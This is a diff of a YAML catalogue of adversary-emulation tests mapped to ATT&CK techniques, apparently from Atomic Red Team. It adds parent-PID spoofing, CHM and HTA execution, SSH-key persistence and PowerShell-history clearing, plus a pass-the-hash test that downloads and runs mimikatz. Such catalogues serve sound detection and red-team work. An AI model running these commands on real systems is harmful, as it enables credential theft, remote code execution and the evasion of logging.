@@ -4496,6 +4496,134 @@ privilege-escalation:
           Stop-Process -Name "#{dll_process_name}" -ErrorAction Ignore
           Stop-Process -Name "#{spawnto_process_name}" -ErrorAction Ignore
         name: powershell
+    - name: Parent PID Spoofing - Spawn from Current Process
+      auto_generated_guid: 14920ebd-1d61-491a-85e0-fe98efe37f25
+      description: Spawns a powershell.exe process as a child of the current process.
+      supported_platforms:
+      - windows
+      input_arguments:
+        file_path:
+          description: File path or name of process to spawn
+          type: path
+          default: "$Env:windir\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+        parent_pid:
+          description: PID of process to spawn from
+          type: string
+          default: "$PID"
+        command_line:
+          description: Specified command line to use
+          type: string
+          default: "-Command Start-Sleep 10"
+      dependencies:
+      - description: The AtomicTestHarnesses module must be installed and Start-ATHProcessUnderSpecificParent
+          must be exported in the module.
+        prereq_command: |-
+          $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
+          if (-not $RequiredModule) {exit 1}
+          if (-not $RequiredModule.ExportedCommands['Start-ATHProcessUnderSpecificParent']) {exit 1} else {exit 0}
+        get_prereq_command: 'Install-Module -Name AtomicTestHarnesses -Scope CurrentUser
+          -Force
+
+'
+      executor:
+        command: 'Start-ATHProcessUnderSpecificParent -FilePath #{file_path} -CommandLine
+          ''#{command_line}'' -ParentId #{parent_pid}'
+        name: powershell
+    - name: Parent PID Spoofing - Spawn from Specified Process
+      auto_generated_guid: cbbff285-9051-444a-9d17-c07cd2d230eb
+      description: Spawns a notepad.exe process as a child of the current process.
+      supported_platforms:
+      - windows
+      input_arguments:
+        parent_pid:
+          description: PID of process to spawn from
+          type: string
+          default: "$PID"
+        test_guid:
+          description: Defined test GUID
+          type: string
+          default: 12345678-1234-1234-1234-123456789123
+      dependencies:
+      - description: The AtomicTestHarnesses module must be installed and Start-ATHProcessUnderSpecificParent
+          must be exported in the module.
+        prereq_command: |-
+          $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
+          if (-not $RequiredModule) {exit 1}
+          if (-not $RequiredModule.ExportedCommands['Start-ATHProcessUnderSpecificParent']) {exit 1} else {exit 0}
+        get_prereq_command: 'Install-Module -Name AtomicTestHarnesses -Scope CurrentUser
+          -Force
+
+'
+      executor:
+        command: 'Start-ATHProcessUnderSpecificParent  -ParentId #{parent_pid} -TestGuid
+          #{test_guid}'
+        name: powershell
+    - name: Parent PID Spoofing - Spawn from svchost.exe
+      auto_generated_guid: e9f2b777-3123-430b-805d-5cedc66ab591
+      description: Spawnd a process as a child of the first accessible svchost.exe
+        process.
+      supported_platforms:
+      - windows
+      input_arguments:
+        command_line:
+          description: Specified command line to use
+          type: string
+          default: "-Command Start-Sleep 10"
+        file_path:
+          description: File path or name of process to spawn
+          type: path
+          default: "$Env:windir\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      dependencies:
+      - description: The AtomicTestHarnesses module must be installed and Start-ATHProcessUnderSpecificParent
+          must be exported in the module.
+        prereq_command: |-
+          $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
+          if (-not $RequiredModule) {exit 1}
+          if (-not $RequiredModule.ExportedCommands['Start-ATHProcessUnderSpecificParent']) {exit 1} else {exit 0}
+        get_prereq_command: 'Install-Module -Name AtomicTestHarnesses -Scope CurrentUser
+          -Force
+
+'
+      executor:
+        command: 'Get-CimInstance -ClassName Win32_Process -Property Name, CommandLine,
+          ProcessId -Filter "Name = ''svchost.exe'' AND CommandLine LIKE ''%''" |
+          Select-Object -First 1 | Start-ATHProcessUnderSpecificParent -FilePath #{file_path}
+          -CommandLine ''#{command_line}'''
+        name: powershell
+    - name: Parent PID Spoofing - Spawn from New Process
+      auto_generated_guid: 2988133e-561c-4e42-a15f-6281e6a9b2db
+      description: Creates a notepad.exe process and then spawns a powershell.exe
+        process as a child of it.
+      supported_platforms:
+      - windows
+      input_arguments:
+        command_line:
+          description: Specified command line to use
+          type: string
+          default: "-Command Start-Sleep 10"
+        file_path:
+          description: File path or name of process to spawn
+          type: path
+          default: "$Env:windir\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+        parent_name:
+          description: Parent process to spoof from
+          type: path
+          default: "$Env:windir\\System32\\notepad.exe"
+      dependencies:
+      - description: The AtomicTestHarnesses module must be installed and Start-ATHProcessUnderSpecificParent
+          must be exported in the module.
+        prereq_command: |-
+          $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
+          if (-not $RequiredModule) {exit 1}
+          if (-not $RequiredModule.ExportedCommands['Start-ATHProcessUnderSpecificParent']) {exit 1} else {exit 0}
+        get_prereq_command: 'Install-Module -Name AtomicTestHarnesses -Scope CurrentUser
+          -Force
+
+'
+      executor:
+        command: 'Start-Process -FilePath #{parent_name} -PassThru | Start-ATHProcessUnderSpecificParent
+          -FilePath #{file_path} -CommandLine ''#{command_line}'''
+        name: powershell
   T1034:
     technique:
       id: attack-pattern--c4ad009b-6e13-4419-8d21-918a1652de02
@@ -9448,8 +9576,10 @@ persistence:
     - name: Persist, Download, & Execute
       auto_generated_guid: 62a06ec5-5754-47d2-bcfc-123d8314c6ae
       description: |
-        This test simulates an adversary leveraging bitsadmin.exe to schedule a BITS transfer
-        and execute a payload in multiple steps. This job will remain in the BITS queue for 90 days by default if not removed.
+        This test simulates an adversary leveraging bitsadmin.exe to schedule a BITS transferand execute a payload in multiple steps.
+        Note that in this test, the file executed is not the one downloaded. The downloading of a random file is simply the trigger for getting bitsdamin to run an executable.
+        This has the interesting side effect of causing the executable (e.g. notepad) to run with an Initiating Process of "svchost.exe" and an Initiating Process Command Line of "svchost.exe -k netsvcs -p -s BITS"
+        This job will remain in the BITS queue until complete or for up to 90 days by default if not removed.
       supported_platforms:
       - windows
       input_arguments:
@@ -14655,7 +14785,27 @@ persistence:
       x_mitre_platforms:
       - Linux
       - macOS
-    atomic_tests: []
+      identifier: T1098.004
+    atomic_tests:
+    - name: Modify SSH Authorized Keys
+      auto_generated_guid: 342cc723-127c-4d3a-8292-9c0c6b4ecadc
+      description: "Modify contents of <user-home>/.ssh/authorized_keys to maintain
+        persistence on victim host. \nIf the user is able to save the same contents
+        in the authorized_keys file, it shows user can modify the file.\n"
+      supported_platforms:
+      - macos
+      - linux
+      executor:
+        name: bash
+        elevation_required: false
+        command: 'if [ -f ~/.ssh/authorized_keys ]; then ssh_authorized_keys=$(cat
+          ~/.ssh/authorized_keys); echo $ssh_authorized_keys > ~/.ssh/authorized_keys;
+          fi;
+
+'
+        cleanup_command: 'unset ssh_authorized_keys
+
+'
   T1053.005:
     technique:
       external_references:
@@ -19089,7 +19239,7 @@ credential-access:
       - Ed Williams, Trustwave, SpiderLabs
       identifier: T1003.003
     atomic_tests:
-    - name: Create Volume Shadow Copy with NTDS.dit
+    - name: Create Volume Shadow Copy with vssadmin
       auto_generated_guid: dcebead7-6c28-4b4b-bf3c-79deb1b1fc7f
       description: |
         This test is intended to be run on a domain Controller.
@@ -19127,7 +19277,7 @@ credential-access:
 
         The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.
 
-        This test requires steps taken in the test "Create Volume Shadow Copy with NTDS.dit".
+        This test requires steps taken in the test "Create Volume Shadow Copy with vssadmin".
         A successful test also requires the export of the SYSTEM Registry hive.
         This test must be executed on a Windows Domain Controller.
       supported_platforms:
@@ -19160,7 +19310,7 @@ credential-access:
 
 '
         get_prereq_command: 'echo Run "Invoke-AtomicTest T1003.003 -TestName ''Create
-          Volume Shadow Copy with NTDS.dit''" to fulfuill this requirement
+          Volume Shadow Copy with vassadmin''" to fulfuill this requirement
 
 '
       - description: 'Extract path must exist
@@ -20504,14 +20654,14 @@ credential-access:
         copy_dest:
           description: Destination of the copied file
           type: String
-          default: "%windir%"
+          default: "%temp%"
       executor:
-        command: 'del #{copy_dest}\#{file_name} & esentutl.exe /y /vss #{file_path}
-          /d #{copy_dest}/#{file_name}
+        command: 'esentutl.exe /y /vss #{file_path} /d #{copy_dest}/#{file_name}
 
 '
         name: command_prompt
         elevation_required: true
+        cleanup_command: del
     - name: PowerDump Registry dump of SAM for hashes and usernames
       auto_generated_guid: 804f28fc-68fc-40da-b5a2-e9d0bce5c193
       description: Executes a hashdump by reading the hasshes from the registry.
@@ -21510,8 +21660,10 @@ defense-evasion:
     - name: Persist, Download, & Execute
       auto_generated_guid: 62a06ec5-5754-47d2-bcfc-123d8314c6ae
       description: |
-        This test simulates an adversary leveraging bitsadmin.exe to schedule a BITS transfer
-        and execute a payload in multiple steps. This job will remain in the BITS queue for 90 days by default if not removed.
+        This test simulates an adversary leveraging bitsadmin.exe to schedule a BITS transferand execute a payload in multiple steps.
+        Note that in this test, the file executed is not the one downloaded. The downloading of a random file is simply the trigger for getting bitsdamin to run an executable.
+        This has the interesting side effect of causing the executable (e.g. notepad) to run with an Initiating Process of "svchost.exe" and an Initiating Process Command Line of "svchost.exe -k netsvcs -p -s BITS"
+        This job will remain in the BITS queue until complete or for up to 90 days by default if not removed.
       supported_platforms:
       - windows
       input_arguments:
@@ -22478,6 +22630,31 @@ defense-evasion:
           hostname
           whoami
         name: sh
+    - name: Prevent Powershell History Logging
+      auto_generated_guid: 2f898b81-3e97-4abb-bc3f-a95138988370
+      description: 'Prevents Powershell history
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        command: 'Set-PSReadlineOption –HistorySaveStyle SaveNothing
+
+'
+        name: powershell
+        cleanup_command: Set-PSReadlineOption –HistorySaveStyle SaveIncrementally
+    - name: Clear Powershell History by Deleting History File
+      auto_generated_guid: da75ae8d-26d6-4483-b0fe-700e4df4f037
+      description: 'Clears Powershell history
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        command: 'Remove-Item (Get-PSReadlineOption).HistorySavePath
+
+'
+        name: powershell
   T1070.002:
     technique:
       external_references:
@@ -23024,6 +23201,174 @@ defense-evasion:
 
 '
         name: command_prompt
+    - name: Invoke CHM with default Shortcut Command Execution
+      auto_generated_guid: 29d6f0d7-be63-4482-8827-ea77126c1ef7
+      description: Executes a CHM file with the default Shortcut Command method.
+      supported_platforms:
+      - windows
+      input_arguments:
+        chm_file_path:
+          description: Default path of CHM
+          type: string
+          default: Test.chm
+        hh_file_path:
+          description: path of modified HH.exe
+          type: path
+          default: "$env:windir\\hh.exe"
+      dependencies:
+      - description: The AtomicTestHarnesses module must be installed and Invoke-ATHCompiledHelp
+          must be exported in the module.
+        prereq_command: |-
+          $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
+          if (-not $RequiredModule) {exit 1}
+          if (-not $RequiredModule.ExportedCommands['Invoke-ATHCompiledHelp']) {exit 1} else {exit 0}
+        get_prereq_command: 'Install-Module -Name AtomicTestHarnesses -Scope CurrentUser
+          -Force
+
+'
+      executor:
+        command: 'Invoke-ATHCompiledHelp -HHFilePath #{hh_file_path} -CHMFilePath
+          #{chm_file_path}'
+        name: powershell
+    - name: Invoke CHM with InfoTech Storage Protocol Handler
+      auto_generated_guid: b4094750-5fc7-4e8e-af12-b4e36bf5e7f6
+      description: Executes a CHM file with the ITS protocol handler.
+      supported_platforms:
+      - windows
+      input_arguments:
+        hh_file_path:
+          description: path of modified HH.exe
+          type: path
+          default: "$env:windir\\hh.exe"
+        infotech_storage_handler:
+          description: Default InfoTech Storage Protocol Handler
+          type: string
+          default: its
+        chm_file_path:
+          description: Default path of CHM
+          type: string
+          default: Test.chm
+      dependencies:
+      - description: The AtomicTestHarnesses module must be installed and Invoke-ATHCompiledHelp
+          must be exported in the module.
+        prereq_command: |-
+          $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
+          if (-not $RequiredModule) {exit 1}
+          if (-not $RequiredModule.ExportedCommands['Invoke-ATHCompiledHelp']) {exit 1} else {exit 0}
+        get_prereq_command: 'Install-Module -Name AtomicTestHarnesses -Scope CurrentUser
+          -Force
+
+'
+      executor:
+        command: 'Invoke-ATHCompiledHelp -InfoTechStorageHandler #{infotech_storage_handler}
+          -HHFilePath #{hh_file_path} -CHMFilePath #{chm_file_path}'
+        name: powershell
+    - name: Invoke CHM Simulate Double click
+      auto_generated_guid: 5decef42-92b8-4a93-9eb2-877ddcb9401a
+      description: Executes a CHM file simulating a user double click.
+      supported_platforms:
+      - windows
+      input_arguments:
+        chm_file_path:
+          description: Default path of CHM
+          type: string
+          default: Test.chm
+      dependencies:
+      - description: The AtomicTestHarnesses module must be installed and Invoke-ATHCompiledHelp
+          must be exported in the module.
+        prereq_command: |-
+          $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
+          if (-not $RequiredModule) {exit 1}
+          if (-not $RequiredModule.ExportedCommands['Invoke-ATHCompiledHelp']) {exit 1} else {exit 0}
+        get_prereq_command: 'Install-Module -Name AtomicTestHarnesses -Scope CurrentUser
+          -Force
+
+'
+      executor:
+        command: 'Invoke-ATHCompiledHelp -SimulateUserDoubleClick -CHMFilePath #{chm_file_path}'
+        name: powershell
+    - name: Invoke CHM with Script Engine and Help Topic
+      auto_generated_guid: 4f83adda-f5ec-406d-b318-9773c9ca92e5
+      description: Executes a CHM file with a defined script engine, ITS Protocol
+        Handler, and help topic extension.
+      supported_platforms:
+      - windows
+      input_arguments:
+        topic_extension:
+          description: Default Help Topic
+          type: string
+          default: html
+        hh_file_path:
+          description: path of modified HH.exe
+          type: path
+          default: "$env:windir\\hh.exe"
+        infotech_storage_handler:
+          description: Default InfoTech Storage Protocol Handler
+          type: string
+          default: its
+        script_engine:
+          description: Default Script Engine
+          type: string
+          default: JScript
+        chm_file_path:
+          description: Default path of CHM
+          type: string
+          default: Test.chm
+      dependencies:
+      - description: The AtomicTestHarnesses module must be installed and Invoke-ATHCompiledHelp
+          must be exported in the module.
+        prereq_command: |-
+          $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
+          if (-not $RequiredModule) {exit 1}
+          if (-not $RequiredModule.ExportedCommands['Invoke-ATHCompiledHelp']) {exit 1} else {exit 0}
+        get_prereq_command: 'Install-Module -Name AtomicTestHarnesses -Scope CurrentUser
+          -Force
+
+'
+      executor:
+        command: 'Invoke-ATHCompiledHelp -ScriptEngine #{script_engine} -InfoTechStorageHandler
+          #{infotech_storage_handler} -TopicExtension #{topic_extension} -HHFilePath
+          #{hh_file_path} -CHMFilePath #{chm_file_path}'
+        name: powershell
+    - name: Invoke CHM Shortcut Command with ITS and Help Topic
+      auto_generated_guid: 15756147-7470-4a83-87fb-bb5662526247
+      description: Executes a CHM file using the Shortcut Command method with a defined
+        ITS Protocol Handler, and help topic extension.
+      supported_platforms:
+      - windows
+      input_arguments:
+        topic_extension:
+          description: Default Help Topic
+          type: string
+          default: html
+        hh_file_path:
+          description: path of modified HH.exe
+          type: path
+          default: "$env:windir\\hh.exe"
+        infotech_storage_handler:
+          description: Default InfoTech Storage Protocol Handler
+          type: string
+          default: its
+        chm_file_path:
+          description: Default path of CHM
+          type: string
+          default: Test.chm
+      dependencies:
+      - description: The AtomicTestHarnesses module must be installed and Invoke-ATHCompiledHelp
+          must be exported in the module.
+        prereq_command: |-
+          $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
+          if (-not $RequiredModule) {exit 1}
+          if (-not $RequiredModule.ExportedCommands['Invoke-ATHCompiledHelp']) {exit 1} else {exit 0}
+        get_prereq_command: 'Install-Module -Name AtomicTestHarnesses -Scope CurrentUser
+          -Force
+
+'
+      executor:
+        command: 'Invoke-ATHCompiledHelp -ExecuteShortcutCommand -InfoTechStorageHandler
+          #{infotech_storage_handler} -TopicExtension #{topic_extension} -HHFilePath
+          #{hh_file_path} -CHMFilePath #{chm_file_path}'
+        name: powershell
   T1542.002:
     technique:
       external_references:
@@ -25605,7 +25950,7 @@ defense-evasion:
 
 '
         name: bash
-    - name: Delete-PrefetchFile
+    - name: Delete Prefetch File
       auto_generated_guid: 36f96049-0ad7-4a5f-8418-460acaeb92fb
       description: |
         Delete a single prefetch file.  Deletion of prefetch files is a known anti-forensic technique. To verify execution, Run "(Get-ChildItem -Path "$Env:SystemRoot\prefetch\*.pf" | Measure-Object).Count"
@@ -29111,6 +29456,196 @@ defense-evasion:
 
 '
         name: powershell
+    - name: Invoke HTML Application - Jscript Engine over Local UNC Simulating Lateral
+        Movement
+      auto_generated_guid: 007e5672-2088-4853-a562-7490ddc19447
+      description: Executes an HTA Application using JScript script engine using local
+        UNC path simulating lateral movement.
+      supported_platforms:
+      - windows
+      input_arguments:
+        script_engine:
+          description: Script Engine to use
+          type: string
+          default: JScript
+        hta_file_path:
+          description: HTA file name and or path to be used
+          type: string
+          default: Test.hta
+        mshta_file_path:
+          description: Location of mshta.exe
+          type: string
+          default: "$env:windir\\system32\\mshta.exe"
+      dependencies:
+      - description: The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication
+          must be exported in the module.
+        prereq_command: |-
+          $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
+          if (-not $RequiredModule) {exit 1}
+          if (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}
+        get_prereq_command: 'Install-Module -Name AtomicTestHarnesses -Scope CurrentUser
+          -Force
+
+'
+      executor:
+        command: 'Invoke-ATHHTMLApplication -HTAFilePath #{hta_file_path} -ScriptEngine
+          #{script_engine} -AsLocalUNCPath -SimulateLateralMovement -MSHTAFilePath
+          #{mshta_file_path}'
+        name: powershell
+    - name: Invoke HTML Application - Jscript Engine Simulating Double Click
+      auto_generated_guid: 58a193ec-131b-404e-b1ca-b35cf0b18c33
+      description: Executes an HTA Application using JScript script engine simulating
+        double click.
+      supported_platforms:
+      - windows
+      input_arguments:
+        script_engine:
+          description: Script Engine to use
+          type: string
+          default: JScript
+        hta_file_path:
+          description: HTA file name and or path to be used
+          type: string
+          default: Test.hta
+      dependencies:
+      - description: The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication
+          must be exported in the module.
+        prereq_command: |-
+          $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
+          if (-not $RequiredModule) {exit 1}
+          if (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}
+        get_prereq_command: 'Install-Module -Name AtomicTestHarnesses -Scope CurrentUser
+          -Force
+
+'
+      executor:
+        command: 'Invoke-ATHHTMLApplication -HTAFilePath #{hta_file_path} -ScriptEngine
+          #{script_engine} -SimulateUserDoubleClick'
+        name: powershell
+    - name: Invoke HTML Application - Direct download from URI
+      auto_generated_guid: 39ceed55-f653-48ac-bd19-aceceaf525db
+      description: Executes an HTA Application by directly downloading from remote
+        URI.
+      supported_platforms:
+      - windows
+      input_arguments:
+        mshta_file_path:
+          description: Location of mshta.exe
+          type: string
+          default: "$env:windir\\system32\\mshta.exe"
+        hta_uri:
+          description: URI to HTA
+          type: string
+          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/24549e3866407c3080b95b6afebf78e8acd23352/atomics/T1218.005/src/T1218.005.hta
+      dependencies:
+      - description: The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication
+          must be exported in the module.
+        prereq_command: |-
+          $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
+          if (-not $RequiredModule) {exit 1}
+          if (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}
+        get_prereq_command: 'Install-Module -Name AtomicTestHarnesses -Scope CurrentUser
+          -Force
+
+'
+      executor:
+        command: 'Invoke-ATHHTMLApplication -HTAUri #{hta_uri} -MSHTAFilePath #{mshta_file_path}'
+        name: powershell
+    - name: Invoke HTML Application - JScript Engine with Rundll32 and Inline Protocol
+        Handler
+      auto_generated_guid: e7e3a525-7612-4d68-a5d3-c4649181b8af
+      description: Executes an HTA Application with JScript Engine, Rundll32 and Inline
+        Protocol Handler.
+      supported_platforms:
+      - windows
+      input_arguments:
+        rundll32_file_path:
+          description: Location of rundll32.exe
+          type: string
+          default: "$env:windir\\system32\\rundll32.exe"
+        script_engine:
+          description: Script Engine to use
+          type: string
+          default: JScript
+        protocol_handler:
+          description: Protocol Handler to use
+          type: string
+          default: About
+      dependencies:
+      - description: The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication
+          must be exported in the module.
+        prereq_command: |-
+          $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
+          if (-not $RequiredModule) {exit 1}
+          if (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}
+        get_prereq_command: 'Install-Module -Name AtomicTestHarnesses -Scope CurrentUser
+          -Force
+
+'
+      executor:
+        command: 'Invoke-ATHHTMLApplication -ScriptEngine #{script_engine} -InlineProtocolHandler
+          #{protocol_handler} -UseRundll32 -Rundll32FilePath #{rundll32_file_path}'
+        name: powershell
+    - name: Invoke HTML Application - JScript Engine with Inline Protocol Handler
+      auto_generated_guid: d3eaaf6a-cdb1-44a9-9ede-b6c337d0d840
+      description: Executes an HTA Application with JScript Engine and Inline Protocol
+        Handler.
+      supported_platforms:
+      - windows
+      input_arguments:
+        mshta_file_path:
+          description: Location of mshta.exe
+          type: string
+          default: "$env:windir\\system32\\mshta.exe"
+        script_engine:
+          description: Script Engine to use
+          type: string
+          default: JScript
+        protocol_handler:
+          description: Protocol Handler to use
+          type: string
+          default: About
+      dependencies:
+      - description: The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication
+          must be exported in the module.
+        prereq_command: |-
+          $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
+          if (-not $RequiredModule) {exit 1}
+          if (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}
+        get_prereq_command: 'Install-Module -Name AtomicTestHarnesses -Scope CurrentUser
+          -Force
+
+'
+      executor:
+        command: 'Invoke-ATHHTMLApplication -ScriptEngine #{script_engine} -InlineProtocolHandler
+          #{protocol_handler} -MSHTAFilePath #{mshta_file_path}'
+        name: powershell
+    - name: Invoke HTML Application - Simulate Lateral Movement over UNC Path
+      auto_generated_guid: b8a8bdb2-7eae-490d-8251-d5e0295b2362
+      description: Executes an HTA Application with Simulate lateral movement over
+        UNC Path.
+      supported_platforms:
+      - windows
+      input_arguments:
+        mshta_file_path:
+          description: Location of mshta.exe
+          type: string
+          default: "$env:windir\\system32\\mshta.exe"
+      dependencies:
+      - description: The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication
+          must be exported in the module.
+        prereq_command: |-
+          $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
+          if (-not $RequiredModule) {exit 1}
+          if (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}
+        get_prereq_command: 'Install-Module -Name AtomicTestHarnesses -Scope CurrentUser
+          -Force
+
+'
+      executor:
+        command: 'Invoke-ATHHTMLApplication -TemplatePE -AsLocalUNCPath -MSHTAFilePath
+          #{mshta_file_path}'
+        name: powershell
   T1218.007:
     technique:
       created: '2020-01-24T14:38:49.266Z'
@@ -30010,6 +30545,134 @@ defense-evasion:
           Stop-Process -Name "#{dll_process_name}" -ErrorAction Ignore
           Stop-Process -Name "#{spawnto_process_name}" -ErrorAction Ignore
         name: powershell
+    - name: Parent PID Spoofing - Spawn from Current Process
+      auto_generated_guid: 14920ebd-1d61-491a-85e0-fe98efe37f25
+      description: Spawns a powershell.exe process as a child of the current process.
+      supported_platforms:
+      - windows
+      input_arguments:
+        file_path:
+          description: File path or name of process to spawn
+          type: path
+          default: "$Env:windir\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+        parent_pid:
+          description: PID of process to spawn from
+          type: string
+          default: "$PID"
+        command_line:
+          description: Specified command line to use
+          type: string
+          default: "-Command Start-Sleep 10"
+      dependencies:
+      - description: The AtomicTestHarnesses module must be installed and Start-ATHProcessUnderSpecificParent
+          must be exported in the module.
+        prereq_command: |-
+          $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
+          if (-not $RequiredModule) {exit 1}
+          if (-not $RequiredModule.ExportedCommands['Start-ATHProcessUnderSpecificParent']) {exit 1} else {exit 0}
+        get_prereq_command: 'Install-Module -Name AtomicTestHarnesses -Scope CurrentUser
+          -Force
+
+'
+      executor:
+        command: 'Start-ATHProcessUnderSpecificParent -FilePath #{file_path} -CommandLine
+          ''#{command_line}'' -ParentId #{parent_pid}'
+        name: powershell
+    - name: Parent PID Spoofing - Spawn from Specified Process
+      auto_generated_guid: cbbff285-9051-444a-9d17-c07cd2d230eb
+      description: Spawns a notepad.exe process as a child of the current process.
+      supported_platforms:
+      - windows
+      input_arguments:
+        parent_pid:
+          description: PID of process to spawn from
+          type: string
+          default: "$PID"
+        test_guid:
+          description: Defined test GUID
+          type: string
+          default: 12345678-1234-1234-1234-123456789123
+      dependencies:
+      - description: The AtomicTestHarnesses module must be installed and Start-ATHProcessUnderSpecificParent
+          must be exported in the module.
+        prereq_command: |-
+          $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
+          if (-not $RequiredModule) {exit 1}
+          if (-not $RequiredModule.ExportedCommands['Start-ATHProcessUnderSpecificParent']) {exit 1} else {exit 0}
+        get_prereq_command: 'Install-Module -Name AtomicTestHarnesses -Scope CurrentUser
+          -Force
+
+'
+      executor:
+        command: 'Start-ATHProcessUnderSpecificParent  -ParentId #{parent_pid} -TestGuid
+          #{test_guid}'
+        name: powershell
+    - name: Parent PID Spoofing - Spawn from svchost.exe
+      auto_generated_guid: e9f2b777-3123-430b-805d-5cedc66ab591
+      description: Spawnd a process as a child of the first accessible svchost.exe
+        process.
+      supported_platforms:
+      - windows
+      input_arguments:
+        command_line:
+          description: Specified command line to use
+          type: string
+          default: "-Command Start-Sleep 10"
+        file_path:
+          description: File path or name of process to spawn
+          type: path
+          default: "$Env:windir\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      dependencies:
+      - description: The AtomicTestHarnesses module must be installed and Start-ATHProcessUnderSpecificParent
+          must be exported in the module.
+        prereq_command: |-
+          $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
+          if (-not $RequiredModule) {exit 1}
+          if (-not $RequiredModule.ExportedCommands['Start-ATHProcessUnderSpecificParent']) {exit 1} else {exit 0}
+        get_prereq_command: 'Install-Module -Name AtomicTestHarnesses -Scope CurrentUser
+          -Force
+
+'
+      executor:
+        command: 'Get-CimInstance -ClassName Win32_Process -Property Name, CommandLine,
+          ProcessId -Filter "Name = ''svchost.exe'' AND CommandLine LIKE ''%''" |
+          Select-Object -First 1 | Start-ATHProcessUnderSpecificParent -FilePath #{file_path}
+          -CommandLine ''#{command_line}'''
+        name: powershell
+    - name: Parent PID Spoofing - Spawn from New Process
+      auto_generated_guid: 2988133e-561c-4e42-a15f-6281e6a9b2db
+      description: Creates a notepad.exe process and then spawns a powershell.exe
+        process as a child of it.
+      supported_platforms:
+      - windows
+      input_arguments:
+        command_line:
+          description: Specified command line to use
+          type: string
+          default: "-Command Start-Sleep 10"
+        file_path:
+          description: File path or name of process to spawn
+          type: path
+          default: "$Env:windir\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+        parent_name:
+          description: Parent process to spoof from
+          type: path
+          default: "$Env:windir\\System32\\notepad.exe"
+      dependencies:
+      - description: The AtomicTestHarnesses module must be installed and Start-ATHProcessUnderSpecificParent
+          must be exported in the module.
+        prereq_command: |-
+          $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
+          if (-not $RequiredModule) {exit 1}
+          if (-not $RequiredModule.ExportedCommands['Start-ATHProcessUnderSpecificParent']) {exit 1} else {exit 0}
+        get_prereq_command: 'Install-Module -Name AtomicTestHarnesses -Scope CurrentUser
+          -Force
+
+'
+      executor:
+        command: 'Start-Process -FilePath #{parent_name} -PassThru | Start-ATHProcessUnderSpecificParent
+          -FilePath #{file_path} -CommandLine ''#{command_line}'''
+        name: powershell
   T1550.002:
     technique:
       external_references:
@@ -30078,10 +30741,28 @@ defense-evasion:
           description: domain
           type: string
           default: atomic.local
-      executor:
-        command: 'mimikatz # sekurlsa::pth /user:#{user_name} /domain:#{domain} /ntlm:#{ntlm}
+        mimikatz_path:
+          description: mimikatz windows executable
+          type: Path
+          default: "%tmp%\\mimikatz\\x64\\mimikatz.exe"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Mimikatz executor must exist on disk and at specified location
+          (#{mimikatz_path})
 
 '
+        prereq_command: |
+          $mimikatz_path = cmd /c echo #{mimikatz_path}
+          if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
+        get_prereq_command: |
+          $mimikatz_path = cmd /c echo #{mimikatz_path}
+          Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip" -OutFile "$env:TEMP\mimikatz.zip"
+          Expand-Archive $env:TEMP\mimikatz.zip $env:TEMP\mimikatz -Force
+          New-Item -ItemType Directory (Split-Path $mimikatz_path) -Force | Out-Null
+          Move-Item $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatz_path -Force
+      executor:
+        command: "#{mimikatz_path} sekurlsa::pth /user:#{user_name} /domain:#{domain}
+          /ntlm:#{ntlm}\n"
         name: command_prompt
     - name: crackmapexec Pass the Hash
       auto_generated_guid: eb05b028-16c8-4ad8-adea-6f5b219da9a9
@@ -35426,7 +36107,7 @@ defense-evasion:
           default: Everyone
       dependency_executor_name: command_prompt
       dependencies:
-      - description: 'Test requrires a file to modifyto be located at (#{file_or_folder})
+      - description: 'Test requrires a file to modify to be located at (#{file_or_folder})
 
 '
         prereq_command: 'IF EXIST #{file_or_folder} ( EXIT 0 ) ELSE ( EXIT 1 )
@@ -35437,7 +36118,7 @@ defense-evasion:
           echo T1222.001_cacls1 >> #{file_or_folder}\T1222.001_cacls1.txt
